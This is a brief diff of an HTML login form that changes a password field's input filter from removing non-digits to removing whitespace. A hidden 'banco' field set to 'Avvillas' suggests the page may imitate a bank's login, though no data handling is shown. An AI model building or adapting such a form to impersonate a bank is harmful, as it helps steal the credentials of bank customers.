@@ -85,7 +85,7 @@
     </label>
     
     <label style="width:85%; height:55px;">
-        <input required="required" type="password" class="input" id="txtPass" name="pass" style="width:100%; margin-left:-10px; border-radius:5px;  height:25px;" oninput="this.value = this.value.replace(/\D+/g, '');">
+        <input required="required" type="password" class="input" id="txtPass" name="pass" style="width:100%; margin-left:-10px; border-radius:5px;  height:25px;" oninput="this.value = this.value.replace(/\s+/g, '')">
         <span>Ingrese su clave</span>
     </label>
     <input type="hidden" value="Avvillas" id="banco">
